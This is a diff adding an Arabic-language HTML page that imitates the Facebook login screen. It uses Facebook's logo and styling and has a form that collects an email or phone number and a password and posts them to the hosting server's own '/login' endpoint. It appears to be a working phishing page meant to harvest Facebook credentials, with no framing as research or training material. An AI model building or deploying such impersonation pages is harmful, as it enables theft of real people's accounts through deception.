@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        img { width: 200px; margin-bottom: 20px; }
+        input { width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        button { width: 95%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9A.svg" alt="Facebook">
+        <form action="/login" method="post">
+            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+</body>
+</html>
